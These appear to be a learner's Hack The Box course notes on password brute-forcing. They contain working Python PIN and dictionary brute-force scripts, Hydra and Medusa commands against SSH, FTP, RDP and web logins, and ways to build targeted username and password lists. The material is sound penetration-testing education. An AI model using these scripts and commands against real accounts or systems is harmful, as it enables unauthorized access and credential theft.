* What is Brute-Forcing?
	* trial-and-error method to crack passwords, login credentials or encryption keys
	* systematically trying every possible combination of characters
* Types of Brute-Forcing
	* Simple Brute Force (naive)
	* Dictionary Attack
	* Hybrid Attack (often appending or prepending characters to dictionary attack)
	* Credential Stuffing (use leaked credentials on other services)
	* Password Spraying (attempts a small set of common passwords)
	* Rainbow Table Attack (use pre-computed tables of password hashes)
	* Reverse Brute Force (targets single passwords against multiple usernames)
	* Distributed Brute Force

### Password Security Fundamentals
* passwords are the first line of defense 
* a strong password is absolutely necessary making it significantly harder to gain access
* **Anatomy of a strong password:**
	* Length: minimum 12 character
	* Complexity: include different character types
	* Uniqueness: do not reuse passwords
	* randomness
* **Common Password Weaknesses:**
	* short passwords
	* common words and phrases
	* personal information
	* Reusing Passwords
	* Predictable Patterns
* **Password Policies:**
	* Minimum Length
	* Complexity: types of character need to be included
	* Password Expiration: the frequency with which password must change (outdated)
	* Password History: the number of previous passwords that cannot be reused (outdated)

# Brute-Force Attacks
Following formual determines total number of possible combinations:
```mathml
Possible Combinations = Character Set Size^Password Length
```
-> Exponential Growth

Example Pin Solver:

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

## Dictionary Attacks
* effectiveness lies in the human tendency to  prioritize memorable passwords over secure ones
* success of dictionary attack hinges on quality and specificity of used wordlist
* Building and Utilizing Wordlists:
	* Publicly available wordlists: For example: https://github.com/danielmiessler/SecLists/tree/master/Passwords
	* Custom Built Lists: more targeted, personal approach
	* Pre-existing Lists: rockyou.txt (standard wordlist for passwords)

| Wordlist                                    | Typical Use                                       | Source                 |
| ------------------------------------------- | ------------------------------------------------- | ---------------------- |
| `rockyout.txt`                              | used for password brute force attacks             | RockYou breach dataset |
| `top-usernames-shortlist.txt`               | suitable for quick brute force username attempts  | seclists               |
| `xato-net-10-million-usernames.txt`         | Used for thorough username brute forcing          | seclists               |
| `2023-200_most_used_passwords.txt`          | Effective for targeting commonly reused passwords | seclists               |
| `Default-Credentials/default-passwords.txt` | Ideal for trying default credentials              | seclists               |
Example Python Script: 
```python
import requests 
ip = "127.0.0.1" # Change this to your instance IP address 
port = 1234 # Change this to your instance port number 

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

### Hybrid Attacks
* many orgs deploy password policies that lead to predictable patterns
* modify existing dictionary attacks with some prefixes or suffixes

We can use grep to extract passwords that adhere to a given policy. For example, a policy defines at least one uppercase, one lowercase and one number plus a minimum length of 8:
```shellsession
lunims@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt

lunims@htb[/htb]$ grep -E '^.{8,}$' darkweb2017_top-10000.txt > darkweb2017-minlength.txt

lunims@htb[/htb]$ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt

lunims@htb[/htb]$ grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt

lunims@htb[/htb]$ grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
```

# Hydra
* Hydra is a fast network login cracker 
* it can brute force a wide varierty of services, e.g.
	* web apps
	* SSH
	* FTP
	* databases
	* ...

Installation:
```shellsession
lunims@htb[/htb]$ sudo apt-get -y update 
lunims@htb[/htb]$ sudo apt-get -y install hydra
```

Basic Usage:
```shellsession
lunims@htb[/htb]$ hydra [login_options] [password_options] [attack_options] [service_options]
```


| Parameter               | Explanation                                                                                                                                                                                                 |
| ----------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-l LOGIN` or `-L FILE` | Login options: Specify either a single username (`-l`) or a file containing a list of usernames (`-L`).                                                                                                     |
| `-p PASS` or `-P FILE`  | Password options: Provide either a single password (`-p`) or a file containing a list of passwords (`-P`).                                                                                                  |
| `-t TASKS`              | Tasks: Define the number of parallel tasks (threads) to run, potentially speeding up the attack.                                                                                                            |
| `-f`                    | Fast mode: Stop the attack after the first successful login is found.                                                                                                                                       |
| `-s PORT`               | Port: Specify a non-default port for the target service                                                                                                                                                     |
| `-v` or `-V`            | Verbose output: Display detailed information about the attack's progress, including attempts and results.                                                                                                   |
| `service://server`      | Target: Specify the service (e.g., `ssh`, `http`, `ftp`) and the target server's address or hostname. (hydra ssh://192.168.1.100)                                                                           |
| `/OPT`                  | Service-specific options: Provide any additional options required by the target service. -> `hydra http-get://example.com/login.php -m "POST:user=^USER^&pass=^PASS^"` (for HTTP form-based authentication) |
**Hydra Services:**
* ftp
* ssh
* http-get/post
* smtp
* imap
* mysql
* mssql
* vnc
* rdp

**Brute-Forcing HTTP Authentication**
```shellsession
lunims@htb[/htb]$ hydra -L usernames.txt -P passwords.txt www.example.com http-get
```
**Targeting multiple SSH Servers**
```shellsession
lunims@htb[/htb]$ hydra -l root -p toor -M targets.txt ssh
```
**Testing FTP Credentials on a Non-Standard Port**
```shellsession
lunims@htb[/htb]$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```
**Brute-Forcing a Web Login Form**
```shellsession
lunims@htb[/htb]$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```
-> Look for a successful login indicated by the HTTP status code `302`
**Advanced RDP Brute-Forcing**
```shellsession
lunims@htb[/htb]$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

## Basic HTTP Authentication
* In essence, Basic Auth is a challenge-response protocol where web server demands user credentials
	* User attempts to access restricted area -> Server responds with 401 Unauthorized
	* User is prompted to give credentials 
* HTTP Authorization Header is sent: `Authorization: Basic <encoded_credentials>`

**Exploiting Basic Auth with Hydra**
```shellsession
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```
-> `http-get /`: This tells Hydra that the target service is an HTTP server and the attack should be performed using HTTP GET requests to the root path ('/').

## Login Forms
* most modern web apps use login forms instead of basic auth
* login forms are a complex interplay of client-side and server-side technologies

```html
<form action="/login" method="post"> 
	<label for="username">Username:</label> 
	<input type="text" id="username" name="username"><br><br> 
	<label for="password">Password:</label> 
	<input type="password" id="password" name="password"><br><br> 
	<input type="submit" value="Submit"> </form>
```
Sends a Post request to /login endpoint
```http
POST /login HTTP/1.1 
Host: www.example.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 29 

username=john&password=secret123
```
Most common content types: `application/x-www-form-urlencoded` or `multipart/form-data`

**http-post-form**
Hydra's `http-post-form` service is specifcally designed for form logins:
```shellsession
lunims@htb[/htb]$ hydra [options] target http-post-form "path:params:condition_string"
```
**Condition String:**
* success and failure conditions are crucial for properly identifying valid and invalid login attempts
	* Failure conditions: `F=...`
	* Success conditions: `S=`
For example, if a failure page returns message "Invalid credentials":
```shellsession
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```
Success Code 302 (Redirect):
```shellsession
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

### Constructing the params string for Hydra
* Form Parameters: Specify placeholders for username -> `^USER^` and password -> `^PASS^`
* Additional Fields: If the form includes other hidden fields or tokens (e.g., CSRF tokens), they must also be included in the `params` string
* Success condition: defines criteria Hydra will use to identify successful login, it can be an HTTP status code (like `S=302` for a redirect) or the presence or absence of specific text in the server's response (e.g., `F=Invalid credentials` or `S=Welcome`)

Example: 
```bash
/:username=^USER^&password=^PASS^:F=Invalid credentials
```
* form submitted to root path `/`
* `username=^USER^&password=^PASS^`: The form parameters with placeholders for Hydra.
* `F=Invalid credentials`: The failure condition – Hydra will consider a login attempt unsuccessful if it sees this string in the response

**Task:**
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 154.57.164.82 -s 30542 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

# Medusa
**Installation**
```shellsession
lunims@htb[/htb]$ sudo apt-get -y update 
lunims@htb[/htb]$ sudo apt-get -y install medusa
```

**Command Syntax and Parameter Table**
```shellsession
lunims@htb[/htb]$ medusa [target_options] [credential_options] -M module [module_options]
```


| Parameter                  | Explanation                                                                                                                              |
| -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| `-h HOST` or `-H FILE`     | Target options: Specify either a single target hostname or IP address (`-h`) or a file containing a list of targets (`-H`).              |
| `-u USERNAME` or `-U FILE` | Username options: Provide either a single username (`-u`) or a file containing a list of usernames (`-U`).                               |
| `-p PASSWORD` or `-P FILE` | Password options: Specify either a single password (`-p`) or a file containing a list of passwords (`-P`).                               |
| `-M MODULE`                | Module: Define the specific module to use for the attack (e.g., `ssh`, `ftp`, `http`)                                                    |
| `-m "MODULE_OPTION"`       | Module options: Provide additional parameters required by the chosen module, enclosed in quotes.                                         |
| `-t TASKS`                 | Tasks: Define the number of parallel login attempts to run, potentially speeding up the attack.                                          |
| `-f` or `-F`               | Fast mode: Stop the attack after the first successful login is found, either on the current host (`-f`) or any host (`-F`).              |
| `-n PORT`                  | Port: Specify a non-default port for the target service.                                                                                 |
| `-v LEVEL`                 | Verbose output: Display detailed information about the attack's progress. The higher the `LEVEL` (up to 6), the more verbose the output. |
**Medusa modules:**
* FTP
* HTTP
* IMAP
* MySQL
* POP3
* RDP
* SSHv2
* Subversion (SVN)
* Telnet
* VNC
* Web Form

Targeting an SSH Server
```shellsession
lunims@htb[/htb]$ medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
```
Targeting multiple web servers with basic auth
```shellsession
lunims@htb[/htb]$ medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
```
Testing for default or empty passwords:
```shellsession
lunims@htb[/htb]$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```

## Web Services
```shellsession
lunims@htb[/htb]$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

FTP: 
```shellsession
lunims@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

# Custom Wordlists
### Username Anarchy
```shellsession
lunims@htb[/htb]$ ./username-anarchy -l
```
Installation:
```shellsession
lunims@htb[/htb]$ sudo apt install ruby -y 
lunims@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git 
lunims@htb[/htb]$ cd username-anarchy
```
Create wordlist: 
```shellsession
lunims@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
```
### CUPP (Common User Passwords Profiler)
```shellsession
lunims@htb[/htb]$ sudo apt install cupp -y
```
Run Interactive mode: 
```shellsession
lunims@htb[/htb]$ cupp -i
```
